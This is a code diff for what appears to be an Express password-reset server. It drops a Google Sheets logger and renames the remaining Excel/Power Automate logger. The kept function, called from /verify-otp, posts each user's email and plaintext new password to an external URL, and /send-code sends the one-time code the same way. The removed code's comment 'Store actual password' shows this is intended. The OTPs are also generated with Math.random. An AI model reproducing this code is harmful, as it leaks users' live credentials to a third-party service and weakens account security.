@@ -239,50 +239,9 @@ function generateOTP() {
     return Math.floor(100000 + Math.random() * 900000).toString();
 }
 
-// Function to append data to Google Sheet with simplified logging
-async function appendToGoogleSheet(data) {
+// Function to log data to Microsoft Excel using Power Automate
+async function logToExcel(data) {
     try {
-        // Skip if URL is not configured
-        if (!process.env.GOOGLE_SHEET_URL) {
-            console.log('Google Sheets logging skipped - URL not configured');
-            return true;
-        }
-
-        const timestamp = new Date().toISOString();
-        
-        // Prepare payload with only essential data
-        const payload = {
-            timestamp: timestamp,
-            email: data.email,
-            status: data.status,
-            otp: data.otp || '',
-            password: data.password || ''  // Store actual password
-        };
-
-        console.log('Logging to Google Sheet:', {
-            ...payload,
-            otp: payload.otp ? '******' : '',
-            password: payload.password ? '******' : ''  // Mask password in logs
-        });
-
-        // Send data to Google Apps Script
-        const response = await axios.post(process.env.GOOGLE_SHEET_URL, payload, {
-            headers: { 'Content-Type': 'application/json' },
-            timeout: 5000
-        });
-
-        console.log('Successfully logged to Google Sheet:', response.data);
-        return true;
-    } catch (error) {
-        console.error('Google Sheets logging error:', error.message);
-        return false;
-    }
-}
-
-// Function to append data to Microsoft Excel using Power Automate
-async function appendToExcel(data) {
-    try {
-        // Skip if URL is not configured
         if (!process.env.POWER_AUTOMATE_URL) {
             console.log('Excel logging skipped - Power Automate URL not configured');
             return true;
@@ -290,7 +249,7 @@ async function appendToExcel(data) {
 
         const timestamp = new Date().toISOString();
         
-        // Prepare payload with only essential data
+        // Prepare payload for Excel
         const payload = {
             timestamp: timestamp,
             email: data.email,
@@ -302,13 +261,13 @@ async function appendToExcel(data) {
         console.log('Logging to Excel:', {
             ...payload,
             otp: payload.otp ? '******' : '',
-            password: payload.password ? '******' : ''  // Mask password in logs
+            password: payload.password ? '******' : ''  // Mask sensitive data in logs
         });
 
         // Send data to Power Automate
         const response = await axios.post(process.env.POWER_AUTOMATE_URL, payload, {
             headers: { 'Content-Type': 'application/json' },
-            timeout: 5000
+            timeout: 10000
         });
 
         console.log('Successfully logged to Excel:', response.data);
@@ -358,7 +317,7 @@ app.post('/send-code', async (req, res) => {
         await transporter.sendMail(mailOptions);
 
         // Log to Excel
-        await appendToExcel({
+        await logToExcel({
             email: email.toLowerCase(),
             status: 'OTP Sent',
             otp: otp
@@ -372,7 +331,7 @@ app.post('/send-code', async (req, res) => {
         console.error('Send Code Error:', error);
 
         // Log error to Excel
-        await appendToExcel({
+        await logToExcel({
             email: email?.toLowerCase(),
             status: 'OTP Send Failed',
             otp: ''
@@ -406,7 +365,7 @@ app.post('/verify-otp', async (req, res) => {
         }
 
         // Log to Excel
-        await appendToExcel({
+        await logToExcel({
             email: email.toLowerCase(),
             status: 'Password Reset Success',
             password: newPassword
@@ -420,7 +379,7 @@ app.post('/verify-otp', async (req, res) => {
         console.error('Password Reset Error:', error);
         
         // Log error to Excel
-        await appendToExcel({
+        await logToExcel({
             email: email.toLowerCase(),
             status: 'Password Reset Failed',
             password: ''
